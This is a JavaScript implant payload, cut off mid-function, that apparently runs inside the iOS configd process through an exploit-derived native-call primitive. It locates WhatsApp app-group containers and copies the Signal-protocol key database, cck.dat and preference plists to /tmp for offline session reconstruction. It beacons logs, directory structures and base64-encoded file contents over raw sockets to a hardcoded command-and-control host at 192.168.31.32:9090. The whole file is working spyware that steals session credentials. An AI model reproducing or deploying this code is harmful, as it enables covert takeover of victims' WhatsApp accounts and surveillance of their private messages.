// E4/P3+ WhatsApp session A.v2 - runs IN configd (not SpringBoard / not WA process)
// Placeholders: __SESSION_ID__ __SESSION_TARGET__
// Goal: copy auth artifacts (Axolotl/plist/cck/KV) to /tmp for pe_exfil + offline assemble
// REQUIRES_P7: identity keys come from pe p7_warmup → /tmp/wa_identity.json (assemble sidecar)
// Stop: /tmp/c2_ipc/session.<id>.stop

const PELOG_HOST = "192.168.31.32";
const PELOG_PORT = 9090;
const SESSION_ID = "__SESSION_ID__";
const SESSION_TARGET = "__SESSION_TARGET__";
const HB_PATH = "/tmp/c2_ipc/session." + SESSION_ID + ".hb";
const STOP_PATH = "/tmp/c2_ipc/session." + SESSION_ID + ".stop";
const STATUS_PATH = "/tmp/c2_ipc/session." + SESSION_ID + ".status";
const EVAL_PATH = "/tmp/c2_ipc/session." + SESSION_ID + ".eval";
const OUT_DIR = "/tmp/wa_auth";
const BUNDLE_HINT = "net.whatsapp.WhatsApp";
const PLIST_NAME = "Library/Preferences/group.net.whatsapp.WhatsApp.shared.plist";
const APPGROUP_BASE = "/private/var/mobile/Containers/Shared/AppGroup";
const METADATA_PLIST = ".com.apple.mobile_container_manager.metadata.plist";
const WA_GROUP_SHARED = "group.net.whatsapp.WhatsApp.shared";
const WA_GROUP_PRIVATE = "group.net.whatsapp.WhatsApp.private";
const WA_GROUP_SMB = "group.net.whatsapp.WhatsAppSMB.shared";
const WA_GROUP_HINTS = [WA_GROUP_SHARED, WA_GROUP_SMB, WA_GROUP_PRIVATE];
// Proven on-device layout (c2debug dump / PASS manifest):
//   <UUID>/Axolotl.sqlite
//   <UUID>/cck.dat
//   <UUID>/Library/Preferences/group.net.whatsapp.WhatsApp.shared.plist
//   <UUID>/BackedUpKeyValue.sqlite + LocalKeyValue.sqlite
// Soft UUID hints from past PASS dumps (may rotate after reinstall).
const WA_KNOWN_GROUP_UUIDS = [
	"F7BF813B-38F6-46F4-84A8-4DD23B929AA8",
	"B9AE769B-DDBF-47E0-9EA7-E730835A807B"
];
const WA_SCAN_DEADLINE_MS = 90000;
const WA_SCAN_INTERVAL_US = 50000; // 50ms between dirs
const WA_EARLY_STOP_RANK = 300; // shared(+200) + Axolotl root(+100)
// Relative probes ordered by proven weight (compat fallbacks lower).
const WA_AX_RELS = [
	{ rel: "Axolotl.sqlite", w: 100 },
	{ rel: "Library/Axolotl.sqlite", w: 90 },
	{ rel: "Documents/Axolotl.sqlite", w: 85 }
];
const WA_PLIST_RELS = [
	{ rel: "Library/Preferences/group.net.whatsapp.WhatsApp.shared.plist", w: 100 },
	{ rel: "group.net.whatsapp.WhatsApp.shared.plist", w: 80 },
	{ rel: "Library/Preferences/net.whatsapp.WhatsApp.plist", w: 70 }
];
const WA_CCK_RELS = [
	{ rel: "cck.dat", w: 100 },
	{ rel: "Library/cck.dat", w: 85 },
	{ rel: "Documents/cck.dat", w: 85 }
];
const WA_KV_RELS = [
	{ rel: "BackedUpKeyValue.sqlite", w: 75 },
	{ rel: "LocalKeyValue.sqlite", w: 75 },
	{ rel: "Library/BackedUpKeyValue.sqlite", w: 60 },
	{ rel: "Library/LocalKeyValue.sqlite", w: 60 }
];
// COPYFILE unused — fread/fwrite copy (copyfile fails under InjectJS Native)

/*__PAYLOAD_FALLBACK_BEGIN__*/
// Shared payload failure fallback (SB bootstrap / pe session).
// On fail: report error + ios/app versions; upload small related files + structure doc.
// Files > 1MiB are skipped. Backend: POST /api/payload/fallback (+ /result category=payload_fallback)

function __fb_readStr(ptr, len) {
  try {
    if (typeof Native.readString === "function") return Native.readString(ptr, len);
  } catch (e) {}
  try {
    if (typeof Native.readCString === "function") return Native.readCString(ptr, len);
  } catch (e) {}
  try {
    if (typeof Native.read === "function") {
      var buff = Native.read(ptr, len);
      var a = new Uint8Array(buff), s = "";
      for (var i = 0; i < a.length; i++) {
        if (!a[i]) break;
        s += String.fromCharCode(a[i]);
      }
      return s;
    }
  } catch (e) {}
  return "";
}

function __fb_sysctlStr(name) {
  try {
    var buf = Native.callSymbol("calloc", 1, 256);
    var lenp = Native.callSymbol("calloc", 1, 8);
    var lv = new DataView(new ArrayBuffer(8));
    lv.setUint32(0, 255, true);
    Native.write(lenp, lv.buffer);
    var rc = Number(Native.callSymbol("sysctlbyname", name, buf, lenp, 0, 0));
    var s = "";
    if (rc === 0) s = __fb_readStr(buf, 256);
    try { Native.callSymbol("free", buf); } catch (e) {}
    try { Native.callSymbol("free", lenp); } catch (e) {}
    return (s || "").replace(/\0/g, "").trim();
  } catch (e) {
    return "";
  }
}

function __fb_iosVersion() {
  var v = __fb_sysctlStr("kern.osproductversion");
  if (!v) v = __fb_sysctlStr("kern.osversion");
  return v || "";
}

function __fb_buildVersion() {
  return __fb_sysctlStr("kern.osversion") || "";
}

function __fb_httpPostJson(path, obj) {
  var host = (typeof BEACON_HOST !== "undefined") ? BEACON_HOST : ((typeof PELOG_HOST !== "undefined") ? PELOG_HOST : "192.168.31.32");
  var port = (typeof BEACON_PORT !== "undefined") ? BEACON_PORT : ((typeof PELOG_PORT !== "undefined") ? PELOG_PORT : 9090);
  var body = JSON.stringify(obj);
  if (typeof _sbPost === "function") {
    try { return _sbPost(host, port, path, "application/json", body); } catch (e) { return null; }
  }
  try {
    var fd = Number(Native.callSymbol("socket", 2, 1, 0));
    if (fd <= 0) return null;
    var sa = Native.callSymbol("calloc", 1, 16);
    var sab = new ArrayBuffer(16), sv = new DataView(sab);
    sv.setUint8(0, 16); sv.setUint8(1, 2); sv.setUint16(2, port, false);
    var p = String(host).split(".");
    sv.setUint8(4, +p[0]); sv.setUint8(5, +p[1]); sv.setUint8(6, +p[2]); sv.setUint8(7, +p[3]);
    Native.write(sa, sab);
    if (Number(Native.callSymbol("connect", fd, sa, 16)) !== 0) {
      Native.callSymbol("free", sa); Native.callSymbol("close", fd); return null;
    }
    Native.callSymbol("free", sa);
    var req = "POST " + path + " HTTP/1.0\r\nHost: " + host + ":" + port +
      "\r\nContent-Type: application/json\r\nContent-Length: " + body.length + "\r\n\r\n" + body;
    var buf = Native.callSymbol("malloc", req.length + 1);
    Native.writeString(buf, req);
    Native.callSymbol("write", fd, buf, req.length);
    Native.callSymbol("free", buf);
    var result = "";
    var rbuf = Native.callSymbol("malloc", 4096);
    if (rbuf) {
      for (var ri = 0; ri < 32; ri++) {
        var n = Number(Native.callSymbol("read", fd, rbuf, 4095));
        if (n <= 0) break;
        result += __fb_readStr(rbuf, n);
      }
      Native.callSymbol("free", rbuf);
    }
    Native.callSymbol("close", fd);
    var idx = result.indexOf("\r\n\r\n");
    var raw = idx >= 0 ? result.substring(idx + 4) : "";
    if (!raw) return {};
    try { return JSON.parse(raw); } catch (e) { return {}; }
  } catch (e) {
    return null;
  }
}

function __fb_b64(str) {
  if (typeof _strToB64 === "function") return _strToB64(str);
  var B = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  var out = "", i = 0;
  while (i < str.length) {
    var c1 = str.charCodeAt(i++) & 0xff;
    var c2 = i < str.length ? str.charCodeAt(i++) & 0xff : NaN;
    var c3 = i < str.length ? str.charCodeAt(i++) & 0xff : NaN;
    var n1 = c1 >> 2;
    var n2 = ((c1 & 3) << 4) | (isNaN(c2) ? 0 : c2 >> 4);
    var n3 = isNaN(c2) ? 64 : (((c2 & 15) << 2) | (isNaN(c3) ? 0 : c3 >> 6));
    var n4 = isNaN(c3) ? 64 : (c3 & 63);
    out += B.charAt(n1) + B.charAt(n2) + (n3 === 64 ? "=" : B.charAt(n3)) + (n4 === 64 ? "=" : B.charAt(n4));
  }
  return out;
}

function __fb_fsSize(path) {
  try {
    var fd = Native.callSymbol("fopen", path, "rb");
    if (!fd || fd === 0 || fd === 0n) return -1;
    Native.callSymbol("fseek", fd, 0, 2);
    var sz = Number(Native.callSymbol("ftell", fd));
    Native.callSymbol("fclose", fd);
    return (sz >= 0 && isFinite(sz)) ? sz : -1;
  } catch (e) {
    return -1;
  }
}

function __fb_fsIsDir(path) {
  try {
    var d = Native.callSymbol("opendir", path);
    if (!d || d === 0 || d === 0n) return false;
    Native.callSymbol("closedir", d);
    return true;
  } catch (e) {
    return false;
  }
}

function __fb_listDir(path, maxEntries) {
  maxEntries = maxEntries || 128;
  var out = [];
  try {
    var d = Native.callSymbol("opendir", path);
    if (!d || d === 0 || d === 0n) return out;
    for (var i = 0; i < maxEntries; i++) {
      var ent = Native.callSymbol("readdir", d);
      if (!ent || ent === 0 || ent === 0n) break;
      var name = __fb_readStr(ent + 21n, 256);
      if (!name || name === "." || name === "..") continue;
      var child = path + "/" + name;
      var entry = { name: name, path: child };
      if (__fb_fsIsDir(child)) {
        entry.type = "dir";
      } else {
        entry.type = "file";
        entry.size = __fb_fsSize(child);
      }
      out.push(entry);
    }
    Native.callSymbol("closedir", d);
  } catch (e) {}
  return out;
}

function __fb_fsRead(path, maxLen) {
  if (typeof _fsRead === "function") {
    try { return _fsRead(path, maxLen); } catch (e) {}
  }
  maxLen = maxLen || 262144;
  try {
    var fd = Native.callSymbol("fopen", path, "rb");
    if (!fd || fd === 0 || fd === 0n) return null;
    var p = Native.callSymbol("malloc", maxLen + 1);
    if (!p) { Native.callSymbol("fclose", fd); return null; }
    var n = Number(Native.callSymbol("fread", p, 1, maxLen, fd));
    Native.callSymbol("fclose", fd);
    var s = n > 0 ? __fb_readStr(p, n) : "";
    if (n > 0 && typeof Native.read === "function") {
      try {
        var buff = Native.read(p, n);
        var a = new Uint8Array(buff);
        s = "";
        for (var i = 0; i < n; i++) s += String.fromCharCode(a[i]);
      } catch (e) {}
    }
    Native.callSymbol("free", p);
    return s;
  } catch (e) {
    return null;
  }
}

function __fb_postFallbackFile(fbId, uid, commandId, filename, dataStr) {
  var payload = {
    command_id: commandId || fbId,
    uuid: uid || "fallback",
    filename: filename,
    category: "payload_fallback",
    fallback_id: fbId,
    data: __fb_b64(dataStr)
  };
  __fb_httpPostJson("/result", payload);
}

/** Max upload size for fallback file content (1 MiB). Larger files are skipped. */
var __FB_MAX_UPLOAD = 1048576;

/**
 * Report payload failure. opts:
 *  module_id, stage, error, app_id, app_version,
 *  related_paths: string[], uid, command_id,
 *  upload_paths: string[]  (only files <= 1MiB; oversized skipped)
 *  Always uploads structure.json (tree / sizes / skip reasons).
 */
function __payloadFallbackReport(opts) {
  opts = opts || {};
  var maxUp = (opts.max_file > 0) ? opts.max_file : __FB_MAX_UPLOAD;
  if (maxUp > __FB_MAX_UPLOAD) maxUp = __FB_MAX_UPLOAD;
  var fbId = "fb-" + Date.now().toString(16) + "-" + Math.floor(Math.random() * 1e6).toString(16);
  var ios = opts.ios_version || __fb_iosVersion();
  var build = opts.build_version || __fb_buildVersion();
  var related = opts.related_paths || opts.paths || [];
  if (!Array.isArray(related)) related = related ? [String(related)] : [];
  var upload = opts.upload_paths || [];
  if (!Array.isArray(upload)) upload = upload ? [String(upload)] : [];
  var uid = opts.uid || opts.uuid || "";

  var structure = {
    fallback_id: fbId,
    max_upload: maxUp,
    related: [],
    upload_plan: [],
    note: "files > " + maxUp + " bytes skipped; only small files + this structure doc"
  };
  var seen = {};
  function addStructPath(path, role) {
    if (!path || seen[path]) return;
    seen[path] = 1;
    var row = { path: path, role: role || "related" };
    if (__fb_fsIsDir(path)) {
      row.type = "dir";
      row.entries = __fb_listDir(path, 128);
    } else {
      var sz = __fb_fsSize(path);
      row.type = "file";
      row.size = sz;
      row.exists = sz >= 0;
      if (sz > maxUp) {
        row.skip = "over_1m";
        row.upload = false;
      } else if (sz >= 0) {
        row.upload = true;
      } else {
        row.exists = false;
        row.upload = false;
      }
    }
    structure.related.push(row);
  }
  for (var ri = 0; ri < related.length; ri++) addStructPath(related[ri], "related");
  for (var ui = 0; ui < upload.length; ui++) addStructPath(upload[ui], "upload");

  var body = {
    fallback_id: fbId,
    uid: uid,
    module_id: opts.module_id || opts.module || "",
    stage: opts.stage || "",
    error: String(opts.error || opts.message || "").slice(0, 500),
    ios_version: ios,
    build_version: build,
    app_id: opts.app_id || opts.bundle_id || "",
    app_version: opts.app_version || opts.app_ver || "",
    related_paths: related,
    files: [],
    structure: structure,
    command_id: opts.command_id || "",
    meta: opts.meta || {}
  };
  var resp = null;
  try { resp = __fb_httpPostJson("/api/payload/fallback", body); } catch (e) { resp = null; }

  var uploaded = [];
  try {
    var structStr = JSON.stringify(structure, null, 2);
    __fb_postFallbackFile(fbId, uid, opts.command_id, "structure.json", structStr);
    uploaded.push({ path: "structure.json", via: "result", size: structStr.length });
  } catch (se) {
    uploaded.push({ path: "structure.json", via: "err", err: String(se).slice(0, 60) });
  }

  var candidates = [];
  for (var i = 0; i < upload.length; i++) if (upload[i]) candidates.push(upload[i]);
  for (var j = 0; j < structure.related.length; j++) {
    var r = structure.related[j];
    if (r.type === "file" && r.upload && r.role === "related" && candidates.indexOf(r.path) < 0) {
      if (r.size >= 0 && r.size <= 65536) candidates.push(r.path);
    }
  }

  for (var k = 0; k < candidates.length; k++) {
    var path = candidates[k];
    if (!path) continue;
    try {
      var sz = __fb_fsSize(path);
      structure.upload_plan.push({ path: path, size: sz });
      if (sz < 0) {
        uploaded.push({ path: path, via: "skip", err: "missing" });
        continue;
      }
      if (sz > maxUp) {
        uploaded.push({ path: path, via: "skip", err: "over_1m", size: sz });
        continue;
      }
      // Never _exfilFile here (no size guard). Bounded read only.
      var txt = __fb_fsRead(path, maxUp);
      if (txt != null && txt.length > 0) {
        if (txt.length > maxUp) {
          uploaded.push({ path: path, via: "skip", err: "over_1m", size: txt.length });
          continue;
        }
        var slash = path.lastIndexOf("/");
        var fname = slash >= 0 ? path.slice(slash + 1) : path;
        __fb_postFallbackFile(fbId, uid, opts.command_id, fname, txt);
        uploaded.push({ path: path, via: "result", size: txt.length });
      } else {
        uploaded.push({ path: path, via: "skip", err: "unreadable" });
      }
    } catch (ue) {
      uploaded.push({ path: path, via: "err", err: String(ue).slice(0, 60) });
    }
  }

  try {
    if (typeof _c2Log === "function") {
      _c2Log("[FALLBACK] " + (body.module_id || "") + " " + body.error.slice(0, 80) + " id=" + fbId);
    } else if (typeof _log === "function") {
      _log("[FALLBACK] " + (body.module_id || "") + " " + body.error.slice(0, 80) + " id=" + fbId);
    }
  } catch (e) {}

  return {
    fallback_id: fbId,
    ok: !!(resp && (resp.ok || (resp.data && resp.data.ok) || resp.code === 0)),
    resp: resp,
    uploaded: uploaded,
    skipped_over_1m: uploaded.filter(function (x) { return x.err === "over_1m"; }),
    ios_version: ios,
    app_id: body.app_id,
    app_version: body.app_version
  };
}
/*__PAYLOAD_FALLBACK_END__*/

// Native: plain object (configd JSC hangs on large class Native)
var Native = {
	baseAddr: 0n, dlsymAddr: 0n, memcpyAddr: 0n, mallocAddr: 0n, oinvAddr: 0n,
	argMem: 0n, argPtr: 0n, dlsymCache: null,
	init: function () {
		var b = new BigUint64Array(nativeCallBuff);
		this.baseAddr = b[20]; this.dlsymAddr = b[21]; this.memcpyAddr = b[22];
		this.mallocAddr = b[23]; this.oinvAddr = b[24];
		this.dlsymCache = {};
		this.argMem = this._nc(this.mallocAddr, BigInt(0x1000));
		this.argPtr = this.argMem;
	},
	write: function (ptr, buff) {
		var u = new Uint8Array(nativeCallBuff), a = new Uint8Array(buff);
		for (var i = 0; i < a.length; i += 0x1000) {
			var n = a.length - i > 0x1000 ? 0x1000 : a.length - i;
			u.set(a.subarray(i, i + n), 0x1000);
			this._nc(this.memcpyAddr, ptr + BigInt(i), this.baseAddr + 0x1000n, BigInt(n));
		}
	},
	read: function (ptr, length) {
		var buff = new ArrayBuffer(length);
		var out = new Uint8Array(buff);
		for (var i = 0; i < length; i += 0x1000) {
			var n = length - i > 0x1000 ? 0x1000 : length - i;
			this._nc(this.memcpyAddr, this.baseAddr + 0x1000n, ptr + BigInt(i), BigInt(n));
			out.set(new Uint8Array(nativeCallBuff, 0x1000, n), i);
		}
		return buff;
	},
	readCString: function (ptr, maxLen) {
		if (!ptr || ptr === 0n) return "";
		var buff = this.read(ptr, maxLen || 512);
		var a = new Uint8Array(buff), s = "";
		for (var i = 0; i < a.length; i++) { if (!a[i]) break; s += String.fromCharCode(a[i]); }
		return s;
	},
	writeString: function (ptr, str) {
		var b = new ArrayBuffer(str.length + 1), a = new Uint8Array(b);
		for (var i = 0; i < str.length; i++) a[i] = str.charCodeAt(i) & 0xff;
		this.write(ptr, b);
	},
	callSymbol: function (name, x0, x1, x2, x3) {
		this.argPtr = this.argMem;
		if (typeof x0 === "string") { var p = this.argPtr; this.writeString(p, x0); this.argPtr += BigInt(x0.length + 1); x0 = p; }
		if (typeof x1 === "string") { var p1 = this.argPtr; this.writeString(p1, x1); this.argPtr += BigInt(x1.length + 1); x1 = p1; }
		if (typeof x2 === "string") { var p2 = this.argPtr; this.writeString(p2, x2); this.argPtr += BigInt(x2.length + 1); x2 = p2; }
		var r = this._nc(this._dlsym(name), this._arg(x0), this._arg(x1), this._arg(x2), this._arg(x3));
		this.argPtr = this.argMem;
		return r < 0xffffffffn && r > -0xffffffffn ? Number(r) : r;
	},
	_arg: function (v) { return !v && v !== 0 ? 0n : typeof v === "bigint" ? v : BigInt(v); },
	_dlsym: function (name) {
		var hit = this.dlsymCache[name];
		if (hit) return hit;
		var b = new ArrayBuffer(name.length + 1), a = new Uint8Array(b);
		for (var i = 0; i < name.length; i++) a[i] = name.charCodeAt(i) & 0xff;
		new Uint8Array(nativeCallBuff).set(a, 0x1000);
		hit = this._nc(this.dlsymAddr, 0xfffffffffffffffen, this.baseAddr + 0x1000n);
		if (hit) this.dlsymCache[name] = hit;
		return hit;
	},
	_nc: function (addr, x0, x1, x2, x3) {
		var b = new BigUint64Array(nativeCallBuff);
		b[0] = addr; b[100] = x0 || 0n; b[101] = x1 || 0n; b[102] = x2 || 0n; b[103] = x3 || 0n;
		invoker();
		return b[200];
	}
};


function _log(msg) {
	try {
		const body = "seq=0&msg=" + encodeURIComponent(String(msg).slice(0, 500));
		const fd = Native.callSymbol("socket", 2, 1, 0);
		if (fd <= 0) return;
		const sa = Native.callSymbol("calloc", 1, 16);
		const sab = new ArrayBuffer(16), sv = new DataView(sab);
		sv.setUint8(0, 16); sv.setUint8(1, 2); sv.setUint16(2, PELOG_PORT, false);
		const p = PELOG_HOST.split(".");
		sv.setUint8(4, +p[0]); sv.setUint8(5, +p[1]); sv.setUint8(6, +p[2]); sv.setUint8(7, +p[3]);
		Native.write(sa, sab);
		if (Native.callSymbol("connect", fd, sa, 16) !== 0) {
			Native.callSymbol("free", sa); Native.callSymbol("close", fd); return;
		}
		Native.callSymbol("free", sa);
		const req = "POST /pelog HTTP/1.0\r\nHost: " + PELOG_HOST + ":" + PELOG_PORT +
			"\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " + body.length + "\r\n\r\n" + body;
		const buf = Native.callSymbol("malloc", req.length + 1);
		Native.writeString(buf, req);
		Native.callSymbol("write", fd, buf, req.length);
		Native.callSymbol("free", buf);
		Native.callSymbol("close", fd);
	} catch (_) {}
}

function _writeFile(path, body) {
	try {
		const fd = Native.callSymbol("fopen", path, "w");
		if (!fd || fd === 0 || fd === 0n) return false;
		const p = Native.callSymbol("calloc", 1, body.length + 1);
		Native.writeString(p, body);
		Native.callSymbol("fwrite", p, 1, body.length, fd);
		Native.callSymbol("fclose", fd);
		Native.callSymbol("free", p);
		return true;
	} catch (_) {
		return false;
	}
}

function _writeEval(state, extra) {
	try {
		const o = Object.assign({ ts: Date.now(), session_id: SESSION_ID, state: state }, extra || {});
		_writeFile(EVAL_PATH, JSON.stringify(o) + "\n");
	} catch (_) {}
}

function _writeHb(pid, tick, extra) {
	const body = "{\"id\":\"" + SESSION_ID + "\",\"target\":\"" + SESSION_TARGET +
		"\",\"pid\":" + pid + ",\"tick\":" + tick + ",\"ts\":" + Date.now() +
		(extra ? "," + extra : "") + "}\n";
	_writeFile(HB_PATH, body);
}

function _stopRequested() {
	try {
		const fd = Native.callSymbol("fopen", STOP_PATH, "r");
		if (!fd || fd === 0 || fd === 0n) return false;
		Native.callSymbol("fclose", fd);
		return true;
	} catch (_) {
		return false;
	}
}

function _canOpen(path) {
	// Prefer access(F_OK): fopen on some AppGroup UUID dirs hangs forever under configd.
	try {
		if (Number(Native.callSymbol("access", path, 0)) === 0) return true;
	} catch (_) {}
	try {
		const fd = Native.callSymbol("fopen", path, "rb");
		if (!fd || fd === 0 || fd === 0n) return false;
		Native.callSymbol("fclose", fd);
		return true;
	} catch (_) {
		return false;
	}
}

function _exists(path) {
	try {
		return Number(Native.callSymbol("access", path, 0)) === 0;
	} catch (_) {
		return false;
	}
}

function _usleep(us) {
	try { Native.callSymbol("usleep", BigInt(us)); } catch (_) {
		try { Native.callSymbol("usleep", us); } catch (__) {}
	}
}

function _firstWeightedHit(dir, rels) {
	for (let i = 0; i < rels.length; i++) {
		const r = rels[i];
		if (_exists(dir + "/" + r.rel)) return r;
	}
	return null;
}

function _gidRankBonus(gid) {
	if (!gid) return 0;
	if (gid === WA_GROUP_SHARED) return 200;
	if (gid === WA_GROUP_SMB) return 150;
	if (gid === WA_GROUP_PRIVATE) return 80;
	if (gid.indexOf("group.net.whatsapp") >= 0) return 100;
	return 0;
}

function _readHintPath() {
	try {
		const raw = _readFileHead("/tmp/c2_ipc/wa_appgroup.hint", 1024) || "";
		if (!raw) return "";
		const t = raw.trim();
		if (t.charAt(0) === "{") {
			try {
				const o = JSON.parse(t);
				return String((o && (o.path || o.group || o.dir)) || "");
			} catch (_) { return ""; }
		}
		const line = t.split("\n")[0].trim();
		if (line.indexOf("/AppGroup/") >= 0 || line.indexOf("/Shared/AppGroup/") >= 0) return line;
		return "";
	} catch (_) {
		return "";
	}
}

function _scoreGroup(dir) {
	// Weighted by c2debug dump PASS paths: root Axolotl/cck + Library/Preferences plist.
	let score = 0;
	const ax = _firstWeightedHit(dir, WA_AX_RELS);
	if (!ax) return 0;
	score += ax.w;
	const pl = _firstWeightedHit(dir, WA_PLIST_RELS);
	if (pl) score += pl.w;
	const ck = _firstWeightedHit(dir, WA_CCK_RELS);
	if (ck) score += ck.w;
	const kv = _firstWeightedHit(dir, WA_KV_RELS);
	if (kv) score += kv.w;
	return score;
}

function _rankHit(dir, score, gid) {
	return (Number(score) || 0) + _gidRankBonus(gid);
}

function _considerDir(dir, discoveryBase) {
	const sc = _scoreGroup(dir);
	if (sc <= 0) return null;
	const metaId = _metadataGroupId(dir);
	const rank = _rankHit(dir, sc, metaId);
	const discovery = metaId
		? (discoveryBase.indexOf("hint") >= 0 || discoveryBase.indexOf("known") >= 0
			? discoveryBase + "+metadata"
			: "metadata+score")
		: discoveryBase;
	const hit = {
		path: dir,
		group_id: metaId || "",
		score: sc,
		rank: rank,
		discovery: discovery
	};
	_log("[SESSION-WA] appgroup hit score=" + sc + " rank=" + rank +
		" id=" + (metaId || "") + " via=" + discovery +
		" dir=..." + String(dir).slice(-12));
	return hit;
}

function _fileSize(path) {
	try {
		const fd = Native.callSymbol("fopen", path, "rb");
		if (!fd || fd === 0 || fd === 0n) return -1;
		Native.callSymbol("fseek", fd, 0, 2);
		const sz = Native.callSymbol("ftell", fd);
		Native.callSymbol("fclose", fd);
		return Number(sz);
	} catch (_) {
		return -1;
	}
}

function _getenv(name) {
	try {
		const p = Native.callSymbol("getenv", name);
		if (!p || p === 0 || p === 0n) return "";
		return Native.readCString(typeof p === "bigint" ? p : BigInt(p), 512);
	} catch (_) {
		return "";
	}
}

function _copyOne(src, dst) {
	// Prefer fread/fwrite: copyfile() returns -1 in InjectJS Native (seen on configd).
	try {
		if (!_canOpen(src)) return { ok: false, size: 0, err: "missing" };
		try { Native.callSymbol("unlink", dst); } catch (_) {}
		const inFd = Native.callSymbol("fopen", src, "rb");
		if (!inFd || inFd === 0 || inFd === 0n) return { ok: false, size: 0, err: "fopen_src" };
		const outFd = Native.callSymbol("fopen", dst, "wb");
		if (!outFd || outFd === 0 || outFd === 0n) {
			try { Native.callSymbol("fclose", inFd); } catch (_) {}
			return { ok: false, size: 0, err: "fopen_dst" };
		}
		const chunk = 65536;
		const buf = Native.callSymbol("malloc", chunk);
		if (!buf || buf === 0 || buf === 0n) {
			try { Native.callSymbol("fclose", inFd); } catch (_) {}
			try { Native.callSymbol("fclose", outFd); } catch (_) {}
			return { ok: false, size: 0, err: "malloc" };
		}
		let total = 0;
		let err = "";
		for (;;) {
			const n = Native.callSymbol("fread", buf, 1, chunk, inFd);
			const nr = Number(n);
			if (!nr || nr <= 0) break;
			const w = Native.callSymbol("fwrite", buf, 1, nr, outFd);
			if (Number(w) !== nr) {
				err = "short_write";
				break;
			}
			total += nr;
			if (nr < chunk) break;
		}
		try { Native.callSymbol("fclose", inFd); } catch (_) {}
		try { Native.callSymbol("fclose", outFd); } catch (_) {}
		try { Native.callSymbol("free", buf); } catch (_) {}
		try { Native.callSymbol("chmod", dst, 0x1b6); } catch (_) {}
		if (err) return { ok: false, size: total, err: err };
		return { ok: total > 0, size: total, err: total > 0 ? "" : "empty" };
	} catch (e) {
		return { ok: false, size: 0, err: String(e).slice(0, 60) };
	}
}

function _readFileHead(path, maxLen) {
	maxLen = maxLen || 8192;
	try {
		const fd = Native.callSymbol("fopen", path, "rb");
		if (!fd || fd === 0 || fd === 0n) return "";
		const p = Native.callSymbol("malloc", maxLen + 1);
		if (!p || p === 0 || p === 0n) {
			Native.callSymbol("fclose", fd);
			return "";
		}
		const n = Number(Native.callSymbol("fread", p, 1, maxLen, fd));
		Native.callSymbol("fclose", fd);
		let s = "";
		if (n > 0) {
			try {
				const buff = Native.read(typeof p === "bigint" ? p : BigInt(p), n);
				const a = new Uint8Array(buff);
				for (let i = 0; i < n; i++) {
					if (!a[i]) break;
					s += String.fromCharCode(a[i]);
				}
			} catch (_) {
				s = Native.readCString(typeof p === "bigint" ? p : BigInt(p), n + 1);
			}
		}
		try { Native.callSymbol("free", p); } catch (_) {}
		return s;
	} catch (_) {
		return "";
	}
}

function _metadataGroupId(dir) {
	const meta = dir + "/" + METADATA_PLIST;
	if (!_exists(meta)) return "";
	const raw = _readFileHead(meta, 16384);
	if (!raw) return "";
	for (let i = 0; i < WA_GROUP_HINTS.length; i++) {
		if (raw.indexOf(WA_GROUP_HINTS[i]) >= 0) return WA_GROUP_HINTS[i];
	}
	if (raw.indexOf("net.whatsapp.WhatsApp") >= 0) return "net.whatsapp.WhatsApp";
	return "";
}

function _findAppGroupsAll() {
	const hits = [];
	const t0 = Date.now();
	const deadlineMs = WA_SCAN_DEADLINE_MS;
	const seen = {};
	function pushUnique(hit) {
		if (!hit || !hit.path) return;
		if (seen[hit.path]) return;
		seen[hit.path] = true;
		hits.push(hit);
	}
	function tryDir(dir, discoveryBase) {
		if (!dir || seen[dir]) return null;
		const hit = _considerDir(dir, discoveryBase);
		if (!hit) return null;
		pushUnique(hit);
		return hit;
	}
	try {
		_log("[SESSION-WA] appgroup scan begin base=" + APPGROUP_BASE +
			" deadline_ms=" + deadlineMs + " interval_us=" + WA_SCAN_INTERVAL_US);
		// 1) pe hint
		const hint = _readHintPath();
		if (hint) {
			_log("[SESSION-WA] appgroup hint=" + hint.slice(-48));
			const h = tryDir(hint, "hint");
			if (h && h.rank >= WA_EARLY_STOP_RANK) {
				_log("[SESSION-WA] appgroup early-stop via hint rank=" + h.rank);
				hits.sort(function (a, b) { return (b.rank || 0) - (a.rank || 0); });
				return hits;
			}
			if (!h) _log("[SESSION-WA] appgroup hint miss — continue");
		}
		// 2) known dump UUIDs (compat soft hints)
		for (let ki = 0; ki < WA_KNOWN_GROUP_UUIDS.length; ki++) {
			if (Date.now() - t0 > deadlineMs) break;
			const kd = APPGROUP_BASE + "/" + WA_KNOWN_GROUP_UUIDS[ki];
			_log("[SESSION-WA] appgroup known-uuid try ..." + WA_KNOWN_GROUP_UUIDS[ki].slice(0, 8));
			const kh = tryDir(kd, "known_uuid");
			_usleep(WA_SCAN_INTERVAL_US);
			if (kh && kh.rank >= WA_EARLY_STOP_RANK) {
				_log("[SESSION-WA] appgroup early-stop via known_uuid");
				hits.sort(function (a, b) { return (b.rank || 0) - (a.rank || 0); });
				return hits;
			}
		}
		// 3) full enumerate — Axolotl-weighted score; interval between dirs
		const dp = Native.callSymbol("opendir", APPGROUP_BASE);
		if (!dp || dp === 0 || dp === 0n) {
			_log("[SESSION-WA] appgroup opendir fail hits=" + hits.length);
			hits.sort(function (a, b) { return (b.rank || 0) - (a.rank || 0); });
			return hits;
		}
		let scanned = 0;
		let scored = 0;
		let bestRank = 0;
		for (let i = 0; i < 400; i++) {
			if (Date.now() - t0 > deadlineMs) {
				_log("[SESSION-WA] appgroup scan deadline n=" + scanned + " hits=" + hits.length);
				break;
			}
			const ent = Native.callSymbol("readdir", dp);
			if (!ent || ent === 0 || ent === 0n) break;
			const namePtr = (typeof ent === "bigint" ? ent : BigInt(ent)) + 21n;
			const name = Native.readCString(namePtr, 64);
			if (!name || name === "." || name === "..") continue;
			scanned++;
			const dir = APPGROUP_BASE + "/" + name;
			if ((scanned % 5) === 1) {
				_log("[SESSION-WA] appgroup scan n=" + scanned + " hits=" + hits.length +
					" best_rank=" + bestRank + " +" + (Date.now() - t0) + "ms");
			}
			// Cheap gate: only root Axolotl (proven primary) before full weighted score.
			if (!_exists(dir + "/Axolotl.sqlite") &&
				!_exists(dir + "/Library/Axolotl.sqlite") &&
				!_exists(dir + "/Documents/Axolotl.sqlite")) {
				_usleep(WA_SCAN_INTERVAL_US);
				continue;
			}
			const hit = tryDir(dir, "score");
		if (hit) {
			scored++;
			if (hit.rank > bestRank) bestRank = hit.rank;
				// Keep scanning a bit for shared/private/SMB fill, but stop when shared is solid.
